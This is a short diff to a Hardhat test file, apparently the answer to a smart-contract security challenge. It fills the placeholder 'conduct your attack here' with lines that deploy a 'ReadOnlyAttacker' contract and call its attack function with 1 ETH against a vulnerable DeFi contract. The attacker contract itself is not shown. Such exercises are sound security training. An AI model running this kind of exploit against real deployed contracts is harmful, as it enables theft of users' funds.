@@ -42,7 +42,10 @@ describe(NAME, function () {
 
         // prettier-ignore
         it("conduct your attack here", async function () {
-    
+            
+            const AttackerFactory = await ethers.getContractFactory("ReadOnlyAttacker");
+            const attackerContract = await AttackerFactory.deploy(readOnlyContract.address, vulnerableDeFiContract.address);
+            await attackerContract.connect(attackerWallet).attack({value:ethers.utils.parseEther("1")});
     });
 
         after(async function () {
